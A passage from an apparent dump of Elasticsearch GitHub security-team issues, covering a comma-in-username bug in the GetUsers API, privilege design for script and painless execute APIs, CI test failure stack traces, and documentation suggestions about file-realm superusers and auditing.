    ""full_name"" : null,
    ""email"" : null,
    ""metadata"" : {
      ""_reserved"" : true
    },
    ""enabled"" : true
  },
  ""apm_system"" : {
    ""username"" : ""apm_system"",
    ""roles"" : [
      ""apm_system""
    ],
    ""full_name"" : null,
    ""email"" : null,
    ""metadata"" : {
      ""_reserved"" : true
    },
    ""enabled"" : true
  },
  ""remote_monitoring_user"" : {
    ""username"" : ""remote_monitoring_user"",
    ""roles"" : [
      ""remote_monitoring_collector"",
      ""remote_monitoring_agent""
    ],
    ""full_name"" : null,
    ""email"" : null,
    ""metadata"" : {
      ""_reserved"" : true
    },
    ""enabled"" : true
  },
  "","" : {
    ""username"" : "","",
    ""roles"" : [ ],
    ""full_name"" : null,
    ""email"" : null,
    ""metadata"" : { },
    ""enabled"" : true
  }
}
```


","Pinging @elastic/es-security (Team:Security)Thanks for reporting this issue. I can confirm that it is indeed a bug and we are aware of it. The comma characater is used as a separator to support passing [multiple usernames](https://www.elastic.co/guide/en/elasticsearch/reference/current/security-api-get-user.html#security-api-get-user-path-params) which unfortunately does not work well when the username itself contains a comma. The same problem applies not only to usernames but a few other places as well. Right now the workaround is to filter the full list on the client side. 

I tagged this issue with `team-discuss` so it is queued for our team discussion and prioritization.We discussed this.
The general feel was that deprecating commas, and marking them as unsupported in the docs is the best option, but we need to have some more conversations internally.

If we do go down that path, we may wish to include other characters in that scope (e.g. `/`) We've reach consensus that we need to go down the path of deprecating and removing some characters.

For compatibility reasons we need to start by deprecation, but it would be helpful if we can allow admins to opt in to it being an error instead.@ywangd @tvernum there has been a request for clarification about this issue. Does it affect only the native realm, or also those logged in via external authentication providers? In practice, it seems to affect both, but we want to understand if this is really the case or if actually the failure to authenticate external users with commas is being caused by some other problem not explored here. Thanks!@nerophon This issue affects the [GetUsers API](https://www.elastic.co/guide/en/elasticsearch/reference/current/security-api-get-user.html). It does _not_ affect authentication. That is, you can still create a user with username `,` and authenticate  with it. 

By ""external authentication providers"", do you mean things like SAML idP or custom realm? [GetUser API](https://www.elastic.co/guide/en/elasticsearch/reference/current/security-api-get-user.html) does not apply to either of them. In any case, since you are talking about ""failure to authenticate"", I suspect the cause is something else. We'll need details of the error to be able to assist further.@ywangd thanks for the clarification; I've now realised I didn't explain myself properly. The case here is regarding ECE SAML. As per https://github.com/elastic/cloud/issues/85721, that system actually does use the ES Native Realm under the hood, and therefore is limited by this API restriction. So this problem will affect any user of ECE running SAML and having commas in their `prinicple` attribute.Thanks for the additional information @nerophon 
Indeed, this could cause problem for Cloud SSO if it relies on the GetUser API. Unfortunately, there is no easy workaround for it since filtering on the client side might not be feasible due to the large amount of users. For now I guess documentation for the limitation is probably the way to go.We have the same problem for the [GET roles API](https://www.elastic.co/guide/en/elasticsearch/reference/current/security-api-get-role.html) as well. I think adopting the same approach for roles as for usernames makes sense.",no,">bug,:Security/Authentication,Team:Security,"
elastic/elasticsearch,440643011,"REST endpoints xpack.license.post_start_basic|trial should be renamed","The REST endpoints [`xpack.license.post_start_basic`](https://github.com/elastic/elasticsearch/blob/master/x-pack/plugin/src/test/resources/rest-api-spec/api/license.post_start_basic.json) and [`xpack.license.post_start_trial`](https://github.com/elastic/elasticsearch/blob/master/x-pack/plugin/src/test/resources/rest-api-spec/api/license.post_start_trial.json) should be renamed to `xpack.license.start_basic` and `xpack.license.start_trial` respectively, to be consistent with other endpoints.

/cc @elastic/es-clients ","Pinging @elastic/es-securityMuch better names indeed! For awareness as of https://github.com/elastic/elasticsearch/pull/39063 you can now deprecate an API an introduce the renamed one rather then simply renaming the spec file.

This allows the clients to not break already shipped code.",no,":Security/License,Team:Security,"
elastic/elasticsearch,517652912,"Add privilege for script actions","**Describe the feature**: The `manage_watcher` privilege right now only contains the `""cluster:admin/xpack/watcher/*"", ""cluster:monitor/xpack/watcher/*""` actions.

I do think it makes sense to also add `cluster:admin/script/*` (get/put/delete scripts) in there as well, as a watcher admin may need to refer to external scripts.

If you think that makes sense, I'm happy to open a PR for this.
","Pinging @elastic/es-security (:Security/Authorization)Rather than adding new permitted actions to the `manage_watcher` privilege, I think a new privilege such as `manage_scripts` is more consistent with the rest of our privileges namespace.
In this case the role for the watcher user should have both `manage_watcher` and `manage_scripts` privilege.@albertzaharovits 

Do you mean that manage_scripts should be a global permission, and not restricted to watcher?

Would you then also want to support more granular permission, so scripts can only be executed in single or multiple places (like watches)?@P1llus I originally meant to create a new [cluster privilege](https://www.elastic.co/guide/en/elasticsearch/reference/current/security-privileges.html#privileges-list-cluster) to be able to use the GET/PUT/DELETE script APIs.

What you are suggesting, being able to confine the usage of scripts to certain contexts, is a different thing. But I think this is an interesting proposal. I envisage being able to define a list of context names when PUTing the script. I wonder what folks from @elastic/es-core-features think about this?@albertzaharovits 

The reason the idea came up, is just like @spinscale mentioned, when the case is external scripts, just to minimize the possibility of some sort of vulnerability.
Now I have not fully set myself into the capabilities of the external scripts engine, what painless allows and not etc, but If there is any possibilities that the script can be any sort of malicious, being able to have more granular control would be beneficial.

While context level would be great, if that is a really big task, then we should at least be able to give access based on script type maybe?We discussed this in our weekly team meeting.

We have decided on adding a `manage_scripts` cluster privilege that would permit usage of the GET/PUT/DELETE script APIs. This means the `manage_watcher` privilege is not changed. It also means APIs can use all the scripts internally, without requiring any extra privilege (nothing changes in this regard).

What @P1llus is suggesting, to have fine-grained privilege on scripts, and enforce those privileges whenever a script is used, is difficult to achieve at the moment and would have a broad impact (it would be a breaking change). However, this is an interesting proposal that should be explored as part of the work to add the new `manage_scripts` privilege.@bytebilly offered to take the temperature of the requirement for fine-grained script privileges, as we currently don't have a clear idea about the solutions benefiting from such a privilege. @albertzaharovits Thanks for following this up! :)Sorry for the late update here: as of today, I got no evidence that fine-grained access is required. I'll keep an eye on that and will update here in case something will come out.@bytebilly thanks a ton for digging into this! Just to be sure I understand your answer correctly in the context of my initial question: Your answer only refers to the requirement for fine grained privileges, but not for the ask to be able to manage scripts as an watcher admin (which still is an open issue then to have a `manage_scripts` privilege), correct?@spinscale yes that's the case.

We don't have scheduled it yet, given the long list of current priorities.
Let us know if you feel that there are compelling reasons to push it now, happy to evaluate again.We plan to use the execute painless API when creating a Runtime Fields in the Index Pattern Editor. Most of the users that will interact with Runtime Fields at this stage are not eligible for the `manage` privilege so we'll need another solution. `manage_scripts` seems a better fit. 
We should also add this privilege to the Kibana internal user to make the usage of this API transparent for users in this context. 
@bytebilly Can we re-evaluate the priority regarding the need for Runtime Fields ?@jimczi do we need full control over scripts (add, remove, etc) or just execute? I'm not sure we want to grant full control over every stored script (as it would be all or nothing) to any user.

Do we need to add it just to `kibana_system`, and use it after performing sanity checks on user input? In this case, we could just grant `cluster:admin/scripts/painless/execute` without waiting for a new ""public"" role.

What do you think? > Do we need to add it just to kibana_system, and use it after performing sanity checks on user input? In this case, we could just grant cluster:admin/scripts/painless/execute without waiting for a new ""public"" role.

+1, @javanna @jdconrad  do you think it's ok to expect Kibana to always use the `kibana_system` to call the execute API ?Runtime fields don't support stored scripts, so no need for add and remove privilege on our end.  The plan of granting painless/execute role to kibana_system sounds good to me.+1 to what @javanna has already said - there shouldn't be anything dangerous about running these scripts through the execute API> We plan to use the execute painless API when creating a Runtime Fields in the Index Pattern Editor.

Can you clarify how we intend to use this?
I take it that Kibana will construct the execute request in order to verify the accuracy (*) of a runtime field expression that the user enters in the editor.

(*) Would that checking be just for compilation, or will it submit a sample document, or something else?

My concern in the more general case, is that the execute API allow access to specific index metadata (existence of indices, mappings, etc) which Kibana system can access, but the user themselves may not have access to. We need to be sure that we're not opening a new path for the user to escalate their access.
@tvernum The execute API takes in an example document created only for this request, but it also takes in an existing index name and pulls mappings from live indexes. If this is a security risk we need to re-think how we take in mappings. Painless Lab currently also uses this same strategy for score and filter contexts.

I know in the future we would like to provide a doc id and pull that data so the user doesn't have to create an entire example doc -- but maybe this would be easier/better from the Kibana side as a separate request to fill in that data.

Edit: I wonder if Kibana should pull in mappings as a separate request and then the execute api should process them in the same way as the strategy for grabbing an existing document.FYI, Kibana now has runtime field preview in 7.15.0 but I get an error with my Okta account;

```
{""values"":[],""error"":{""root_cause"":[{""type"":""security_exception"",""reason"":""action [cluster:admin/scripts/painless/execute]
 is unauthorized for user [xxxxxxxxxxxxxxxxxxx] with roles 
[watcher_admin,monitoring_user,kibana_user,reporting_user,kibana_admin,everyone-read], 
this action is granted by the cluster privileges [manage,all]""}],
""type"":""security_exception"",""reason"":""action [cluster:admin/scripts/painless/execute]
 is unauthorized for user [xxxxxxxxxxxxxxxxxxx] with roles 
[watcher_admin,monitoring_user,kibana_user,reporting_user,kibana_admin,everyone-read], 
this action is granted by the cluster privileges [manage,all]""},""status"":403}
```



> Runtime fields don't support stored scripts, so no need for add and remove privilege on our end. The plan of granting painless/execute role to kibana_system sounds good to me.

Did we do this?  Or still need to?btw, this is kind of blocking me on one of our internal clusters.  It would be great if we could resolve it in 7.15.1.@LeeDr probably the simplest short-term fix to your problem is adding `cluster:admin/scripts/painless/execute` to your permissions.
A different approach would require changing the way Kibana performs the query, I'm not sure if this is something that they are still evaluating.@bytebilly @LeeDr , we have a plan for this but it felt through the cracks :(. 
Search requests are allowed to execute a script on an index so we'd like to change the painless execute API to also require the read permission if an index is provided, and nothing else. I'll open a PR soon to expose the approach.Thanks @jimczi.  I'm not sure if the change will be something appropriate for a patch release, but 7.15.1 FF is about a week away.  If we can't get it in there, or don't feel the change is appropriate for a patch release, I'll ask Infra to add `cluster:admin/scripts/painless/execute` to the role that all normal users (like me) get.

Also, in case anybody wonders if there's a work-around for adding or editing a runtime field without this privilege, I did look into that.  I figured I could use examples from https://www.elastic.co/guide/en/elasticsearch/reference/master/runtime-mapping-fields.html in the Dev Tools Console to add or replace the runtime field (without hitting the Preview path which I don't have privs for).  But the Elasticsearch examples are adding runtime fields to an index mapping and that's not how Kibana does it (AFAIK).  

I think Kibana saves the runtime field in the Kibana index-pattern saved object and sends the query in searches each time.  
So it seems I could use the Kibana saved object API to write the index pattern.  But I can't do that in the Dev Tools Console (which only accesses Elasticsearch).  So I would have to use curl or a Cloud console...

Or I could execute a command in the Dev Tools Console to modify the index-pattern in the .kibana index. 
While I'm sure that's possible, it seems a bit more complicated with risk of breaking something.  I could probably create a temp Space in Kibana and try modifying the index-pattern in that space to avoid breaking anybody else...@LeeDr let's move the discussion to Kibana. It seems that the creation of runtime field is broken so we should have an issue there. @sebelga must know more about a possible workaround for 7.15.I'd like to revisit this as kibana is still unable to use the execute api. Granting privileges to the `kibana_system` user would cause problems with field level security. I'm not completely certain how access and roles align on the ES side with kibana needs, but if a kibana user can use runtime fields then they should have access to the execute api.

There will be another api created which with take a painless script and return the a field list - part of the UX for creating composite runtime fields. This new api will have similar needs.> but if a kibana user can use runtime fields then they should have access to the execute api.

Could you please expand this a bit more? What do you mean by ""can use""? I think that a user should be able to execute scripts when adding runtime fields, but not when just ""using"" them (e.g. getting results), as they are transparent. Is that what you meant?We have the need for admins to disable runtime field authoring in Kibana. Does it make sense to set that up as a privilege all users have by default which allows both execute for that user, and the authoring UX in Kibana. Admins can disable the privilege globally for Kibana, or by role.>Could you please expand this a bit more?

Sorry, perhaps 'add runtime fields' makes more sense> We have the need for admins to disable runtime field authoring in Kibana.

Which is the main reason for this access control? It is about adding runtime fields to the mapping, or more broadly using them in search queries too? Since these features are available at the Elasticsearch API level, blocking at Kibana level may not be the best approach.

We also don't provide privileges that are automatically granted to all users, or ""negative"" privileges. This would make it more complex to leverage the current privilege model to forbid the use of runtime fields.It might be best to take a step back and have a more thorough conversation about this. 

- Users have requested the ability to disable runtime fields - I'm not sure if you're addressing that and how it should be addressed in concert with kibana. This is in line with goals to make ES / kibana more stable.
- Users who can create runtime fields within kibana - which are run at query time - need access to execute api. This is mostly managed on the kibana side as the privileged is really regarding whether data view saved objects can have runtime field definitions appended to them but the UI to determine if a painless script is valid relies on the execute api.I think that we should split this issue into separate — even if related — discussions:

1. ability to manage stored scripts (e.g. a `manage_script` new privilege)
2. define per-context permissions to execute scripts (allow on runtime fields, forbid on watcher)
3. how to use the `execute` API to test scripts before using them (e.g. during runtime fields authoring)
4. disable runtime fields

We agreed to implement `1` (even if it has not been prioritized), and that `2` is not necessary today.

For the execute call (`3`), AFAIK it only impacts creating a runtime field via the Data Views UI, is it correct? Can we use the Kibana service account to call the API, while fetching the test doc with user credentials to guarantee proper access? Do we have security concerns that the script can leverage Kibana privileges to do something potentially not needed (since the script is user-provided)?

For `4`, do we want to prevent new runtime fields to be added to the Data View, to the index, or to be executed during searches?
@bytebilly for #4, the customer concern centers around the performance impact of users who create Runtime Fields in Kibana without understanding the implications. I took that as concern for users creating them in the UX without knowing the impact. Runtime Fields fields living within the data view potentially increases the overhead for everyone. I agree with separating the issues, but that is why I was conflating them. I don't think we want a kill switch for any runtime field coming from Kibana, we want to give administrators the power to control who can author persisted runtime fields.>I don't think we want a kill switch for any runtime field coming from Kibana, we want to give administrators the power to control who can author persisted runtime fields.

If that the case then there's no reason to involve ES.>Can we use the Kibana service account to call the API, while fetching the test doc with user credentials to guarantee proper access?

I can't take responsibility for the implications of a design decision like that on the ES side. If you tell me that it can't inadvertently result in privileged escalation then I'll believe you. ",no,">enhancement,:Security/Authorization,Team:Security,"
elastic/elasticsearch,1389027120,"[CI] TokenAuthIntegTests testClientCredentialsGrant failing","This might be a Windows-specific issue. Possibly related to build and delivery but tagging as a security team issue since the test is owned by us.

**Build scan:**
https://gradle-enterprise.elastic.co/s/cjdsy35tk3hho/tests/:x-pack:plugin:security:internalClusterTest/org.elasticsearch.xpack.security.authc.TokenAuthIntegTests/testClientCredentialsGrant

**Reproduction line:**
`gradlew ':x-pack:plugin:security:internalClusterTest' --tests ""org.elasticsearch.xpack.security.authc.TokenAuthIntegTests.testClientCredentialsGrant"" -Dtests.seed=9A84EA1252225D9C -Dtests.locale=en-IN -Dtests.timezone=WET -Druntime.java=18`

**Applicable branches:**
main

**Reproduces locally?:**
No

**Failure history:**
https://gradle-enterprise.elastic.co/scans/tests?tests.container=org.elasticsearch.xpack.security.authc.TokenAuthIntegTests&tests.test=testClientCredentialsGrant

**Failure excerpt:**
```
java.io.UncheckedIOException: could not write file [C:\Users\jenkins\workspace\platform-support\381\x-pack\plugin\security\build\testrun\internalClusterTest\temp\org.elasticsearch.xpack.security.authc.TokenAuthIntegTests_9A84EA1252225D9C-001\tempDir-003\SUITE-0\config\operator_users.yml]

  at __randomizedtesting.SeedInfo.seed([9A84EA1252225D9C:CB0C625839D75037]:0)
  at org.elasticsearch.xpack.security.test.SecurityTestUtils.writeFile(SecurityTestUtils.java:58)
  at org.elasticsearch.xpack.security.test.SecurityTestUtils.writeFile(SecurityTestUtils.java:67)
  at org.elasticsearch.test.SecuritySettingsSource.nodeSettings(SecuritySettingsSource.java:152)
  at org.elasticsearch.test.SecurityIntegTestCase.nodeSettings(SecurityIntegTestCase.java:212)
  at org.elasticsearch.xpack.security.authc.TokenAuthIntegTests.nodeSettings(TokenAuthIntegTests.java:79)
  at org.elasticsearch.test.ESIntegTestCase$1.nodeSettings(ESIntegTestCase.java:2018)
  at org.elasticsearch.test.InternalTestCluster.getSettings(InternalTestCluster.java:468)
  at org.elasticsearch.test.InternalTestCluster.getNodeSettings(InternalTestCluster.java:707)
  at org.elasticsearch.test.InternalTestCluster.reset(InternalTestCluster.java:1159)
  at org.elasticsearch.test.InternalTestCluster.beforeTest(InternalTestCluster.java:1085)
  at org.elasticsearch.test.ESIntegTestCase.lambda$beforeInternal$0(ESIntegTestCase.java:362)
  at com.carrotsearch.randomizedtesting.RandomizedContext.runWithPrivateRandomness(RandomizedContext.java:187)
  at com.carrotsearch.randomizedtesting.RandomizedContext.runWithPrivateRandomness(RandomizedContext.java:211)
  at org.elasticsearch.test.ESIntegTestCase.beforeInternal(ESIntegTestCase.java:371)
  at org.elasticsearch.test.ESIntegTestCase.setupTestCluster(ESIntegTestCase.java:2221)
  at jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:104)
  at java.lang.reflect.Method.invoke(Method.java:577)
  at com.carrotsearch.randomizedtesting.RandomizedRunner.invoke(RandomizedRunner.java:1758)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$9.evaluate(RandomizedRunner.java:980)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$10.evaluate(RandomizedRunner.java:996)
  at org.junit.rules.ExternalResource$1.evaluate(ExternalResource.java:48)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.tests.util.TestRuleSetupTeardownChained$1.evaluate(TestRuleSetupTeardownChained.java:44)
  at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
  at org.apache.lucene.tests.util.TestRuleThreadAndTestName$1.evaluate(TestRuleThreadAndTestName.java:45)
  at org.apache.lucene.tests.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:60)
  at org.apache.lucene.tests.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:44)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:390)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl.forkTimeoutingTask(ThreadLeakControl.java:843)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$3.evaluate(ThreadLeakControl.java:490)
  at com.carrotsearch.randomizedtesting.RandomizedRunner.runSingleTest(RandomizedRunner.java:955)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$5.evaluate(RandomizedRunner.java:840)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$6.evaluate(RandomizedRunner.java:891)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$7.evaluate(RandomizedRunner.java:902)
  at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.tests.util.TestRuleStoreClassName$1.evaluate(TestRuleStoreClassName.java:38)
  at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
  at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.tests.util.TestRuleAssertionsRequired$1.evaluate(TestRuleAssertionsRequired.java:53)
  at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
  at org.apache.lucene.tests.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:44)
  at org.apache.lucene.tests.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:60)
  at org.apache.lucene.tests.util.TestRuleIgnoreTestSuites$1.evaluate(TestRuleIgnoreTestSuites.java:47)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:390)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl.lambda$forkTimeoutingTask$0(ThreadLeakControl.java:850)
  at java.lang.Thread.run(Thread.java:833)

  Caused by: java.nio.file.AccessDeniedException: C:\Users\jenkins\workspace\platform-support\381\x-pack\plugin\security\build\testrun\internalClusterTest\temp\org.elasticsearch.xpack.security.authc.TokenAuthIntegTests_9A84EA1252225D9C-001\tempDir-003\SUITE-0\config\operator_users.yml4546994645870407188tmp -> C:\Users\jenkins\workspace\platform-support\381\x-pack\plugin\security\build\testrun\internalClusterTest\temp\org.elasticsearch.xpack.security.authc.TokenAuthIntegTests_9A84EA1252225D9C-001\tempDir-003\SUITE-0\config\operator_users.yml

    at sun.nio.fs.WindowsException.translateToIOException(WindowsException.java:89)
    at sun.nio.fs.WindowsException.rethrowAsIOException(WindowsException.java:103)
    at sun.nio.fs.WindowsFileCopy.move(WindowsFileCopy.java:317)
    at sun.nio.fs.WindowsFileSystemProvider.move(WindowsFileSystemProvider.java:293)
    at org.apache.lucene.tests.mockfile.FilterFileSystemProvider.move(FilterFileSystemProvider.java:144)
    at org.apache.lucene.tests.mockfile.FilterFileSystemProvider.move(FilterFileSystemProvider.java:144)
    at org.apache.lucene.tests.mockfile.FilterFileSystemProvider.move(FilterFileSystemProvider.java:144)
    at org.apache.lucene.tests.mockfile.FilterFileSystemProvider.move(FilterFileSystemProvider.java:144)
    at java.nio.file.Files.move(Files.java:1432)
    at org.elasticsearch.xpack.security.test.SecurityTestUtils.writeFile(SecurityTestUtils.java:53)
    at org.elasticsearch.xpack.security.test.SecurityTestUtils.writeFile(SecurityTestUtils.java:67)
    at org.elasticsearch.test.SecuritySettingsSource.nodeSettings(SecuritySettingsSource.java:152)
    at org.elasticsearch.test.SecurityIntegTestCase.nodeSettings(SecurityIntegTestCase.java:212)
    at org.elasticsearch.xpack.security.authc.TokenAuthIntegTests.nodeSettings(TokenAuthIntegTests.java:79)
    at org.elasticsearch.test.ESIntegTestCase$1.nodeSettings(ESIntegTestCase.java:2018)
    at org.elasticsearch.test.InternalTestCluster.getSettings(InternalTestCluster.java:468)
    at org.elasticsearch.test.InternalTestCluster.getNodeSettings(InternalTestCluster.java:707)
    at org.elasticsearch.test.InternalTestCluster.reset(InternalTestCluster.java:1159)
    at org.elasticsearch.test.InternalTestCluster.beforeTest(InternalTestCluster.java:1085)
    at org.elasticsearch.test.ESIntegTestCase.lambda$beforeInternal$0(ESIntegTestCase.java:362)
    at com.carrotsearch.randomizedtesting.RandomizedContext.runWithPrivateRandomness(RandomizedContext.java:187)
    at com.carrotsearch.randomizedtesting.RandomizedContext.runWithPrivateRandomness(RandomizedContext.java:211)
    at org.elasticsearch.test.ESIntegTestCase.beforeInternal(ESIntegTestCase.java:371)
    at org.elasticsearch.test.ESIntegTestCase.setupTestCluster(ESIntegTestCase.java:2221)
    at jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:104)
    at java.lang.reflect.Method.invoke(Method.java:577)
    at com.carrotsearch.randomizedtesting.RandomizedRunner.invoke(RandomizedRunner.java:1758)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$9.evaluate(RandomizedRunner.java:980)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$10.evaluate(RandomizedRunner.java:996)
    at org.junit.rules.ExternalResource$1.evaluate(ExternalResource.java:48)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at org.apache.lucene.tests.util.TestRuleSetupTeardownChained$1.evaluate(TestRuleSetupTeardownChained.java:44)
    at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
    at org.apache.lucene.tests.util.TestRuleThreadAndTestName$1.evaluate(TestRuleThreadAndTestName.java:45)
    at org.apache.lucene.tests.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:60)
    at org.apache.lucene.tests.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:44)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:390)
    at com.carrotsearch.randomizedtesting.ThreadLeakControl.forkTimeoutingTask(ThreadLeakControl.java:843)
    at com.carrotsearch.randomizedtesting.ThreadLeakControl$3.evaluate(ThreadLeakControl.java:490)
    at com.carrotsearch.randomizedtesting.RandomizedRunner.runSingleTest(RandomizedRunner.java:955)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$5.evaluate(RandomizedRunner.java:840)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$6.evaluate(RandomizedRunner.java:891)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$7.evaluate(RandomizedRunner.java:902)
    at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at org.apache.lucene.tests.util.TestRuleStoreClassName$1.evaluate(TestRuleStoreClassName.java:38)
    at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
    at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at org.apache.lucene.tests.util.TestRuleAssertionsRequired$1.evaluate(TestRuleAssertionsRequired.java:53)
    at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
    at org.apache.lucene.tests.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:44)
    at org.apache.lucene.tests.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:60)
    at org.apache.lucene.tests.util.TestRuleIgnoreTestSuites$1.evaluate(TestRuleIgnoreTestSuites.java:47)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:390)
    at com.carrotsearch.randomizedtesting.ThreadLeakControl.lambda$forkTimeoutingTask$0(ThreadLeakControl.java:850)
    at java.lang.Thread.run(Thread.java:833)

```","Pinging @elastic/es-security (Team:Security)",no,">test-failure,:Security/Security,Team:Security,"
elastic/elasticsearch,585874434,"Skip auth flow if ServerTransportFilter already runs for the same action and user","When a transport request is recieved, the ServerTransportFilter gets to run first and it in turn [runs the auth workflow](https://github.com/elastic/elasticsearch/blob/7.6/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/transport/ServerTransportFilter.java#L121). If the transport request is a TransportAction, the [auth workflow runs again](https://github.com/elastic/elasticsearch/blob/7.6/server/src/main/java/org/elasticsearch/action/support/TransportAction.java#L129) for a 2nd time. 

If the user and action do not change, the 2nd auth flow is unnecessary. Many information is cached and can be re-used for the 2nd time. However there could still be non-negligible overhead involved. This could possibly be improved by setting a flag in ServerTransportFilter and conditionally skipping the 2nd auth flow.","Pinging @elastic/es-security (:Security/Security)",no,">enhancement,:Security/Security,Team:Security,"
elastic/elasticsearch,317448052,"Recommend single admin user in file realm?","*Original comment by @gmoskovicz:*

We have seen cases where:
1. Connections between node is lost and there is no `.security` index for a reason
2. The `.security` index is not initialized correctly.

That said, in Support i think that as a best practice we try to add **at least** a single superuser in the file realm to make sure that whatever it happens with the `.security` index (Cluster issues) you have a user to use to make any actions or fix a problem.

Perhaps it's a good idea to include this in the docs? 

@jaymode what do you think?","*Original comment by @tvernum:*

Big **+1** from me.

Yesterday @markharwood and I worked on a case where it took several hours to get file realm sorted in order to be able to diagnose why shards were failing, and resolve it.

The main problem was that the `users` command was updating a different config directory than the one the node was looking at.

It would have been a huge help if the customer already had the file realm sorted and we could jump straight to recovering the indices.

*Original comment by @jasontedor:*

Note in 6.x it is far less likely we run into this mismatch directory problem due to elasticsearch-env. This is not an argument against the proposal here, only an observation relevant to the case @tvernum mentions. [docs issue triage]

We do recommend [adding a temporary super user](https://www.elastic.co/guide/en/elasticsearch/reference/master/reindex-upgrade-inplace.html) to the file realm before reindexing the .security index, but advise deleting after the upgrade is complete.

@jaymode Is this something we would want to recommend in general? ",no,">enhancement,>docs,:Security/Authentication,Team:Security,"
elastic/elasticsearch,317454042,"Security should audit when no indices are resolved","*Original comment by @jaymode:*

I was looking through our code due to a question asked by a user, https://discuss.elastic.co/t/curator-delete-indices-shield-permissions/29354/2 on the discussion forums and noticed that when we throw an IndexMissingException (user is not authorized for any indices) that we don't have a corresponding audit event. This should probably be a `access_denied` event...


",,no,">bug,v2.1.0,:Security/Audit,Team:Security,"
elastic/elasticsearch,560238986,"[TEST] DocumentSubsetBitsetCacheTests.testCacheUnderConcurrentAccess failing","https://gradle-enterprise.elastic.co/s/wl7uqqpo2ep7e/tests/sbbvdtbroicas-3wxlzqkg2i6xo

```
java.lang.AssertionError: Query threads did not complete in expected timeClose stacktrace
at __randomizedtesting.SeedInfo.seed([56E0E4E4803B5BAC:BAEA805D1F939CFE]:0)
at org.junit.Assert.fail(Assert.java:88)
at org.junit.Assert.assertTrue(Assert.java:41)
at org.elasticsearch.xpack.core.security.authz.accesscontrol.DocumentSubsetBitsetCacheTests.lambda$testCacheUnderConcurrentAccess$13(DocumentSubsetBitsetCacheTests.java:396)
at org.elasticsearch.xpack.core.security.authz.accesscontrol.DocumentSubsetBitsetCacheTests.runTestOnIndices(DocumentSubsetBitsetCacheTests.java:554)
at org.elasticsearch.xpack.core.security.authz.accesscontrol.DocumentSubsetBitsetCacheTests.testCacheUnderConcurrentAccess(DocumentSubsetBitsetCacheTests.java:372)
at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
